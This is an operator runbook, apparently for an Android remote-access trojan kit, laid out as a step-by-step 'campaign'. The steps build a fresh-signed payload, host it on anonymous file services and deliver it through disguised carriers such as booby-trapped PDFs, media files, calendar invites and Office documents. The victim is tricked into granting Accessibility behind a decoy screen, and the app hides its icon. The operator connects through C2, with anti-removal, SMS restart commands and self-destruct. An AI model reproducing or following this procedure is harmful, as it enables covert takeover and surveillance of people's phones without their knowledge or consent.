# 15 — Operator runbook

## Step 0 — before every campaign

1. Confirm JDK 17/21 and build-tools 34+: `java -version`, `sdkmanager --list_installed`
2. Decide transport (relay / sheet / none) — it is compiled in, not swappable
3. New package ID and new keystore per campaign
4. Note the build timestamp and config — you will need it for triage

## Step 1 — build

Option 1, or option 6 for the full chain.

## Step 2 — host

Wizard option 6 uploads to Catbox and falls back to Litterbox → Tmpfiles → manual URL.
Prefer your own host for campaigns longer than a week; anonymous hosts expire.

## Step 3 — deliver

Pick the carrier matching the channel:

| Channel | Carrier |
|---|---|
| Email | Stealth PDF |
| WhatsApp / Telegram | Zero-Click MP4, Ghost GIF |
| Calendar / meeting | ICS |
| Physical / in-person | NFC NDEF, QR |
| Enterprise | Office Word or Excel |

## Step 4 — install and initialize

Open the app once. Toggle Accessibility only. Everything else is granted behind the
decoy screen. Confirm the icon swaps to the decoy after ~5s.

## Step 5 — establish access

Check the sheet/relay for the row, open the C2 link. Change the password. Verify
`http://[gua]:9191` from the operator host before relying on the relay.

## Step 6 — operate

- `RESTART_SERVER` if controls time out
- `REPAIR PERMISSIONS` in Ghost Utilities if permissions were revoked
- Anti-removal is on by default in the Ghost tab
- SMS `!RESTART_C2` brings the service back after an OS kill

## Step 7 — recover

| Symptom | Action |
|---|---|
| Icon gone, no decoy visible | Dial `*#1337#` |
| Stealth, dashboard hidden | Tap centre of decoy 10× |
| No IPv6 GUA on carrier | Switch to relay |
| App killed by OEM manager | Disable battery optimisation, enable Autostart (Xiaomi/Huawei) |

## Step 8 — teardown

Suicide (self-destruct) wipes local config and uninstalls the core. Rotate the keystore
between engagements.
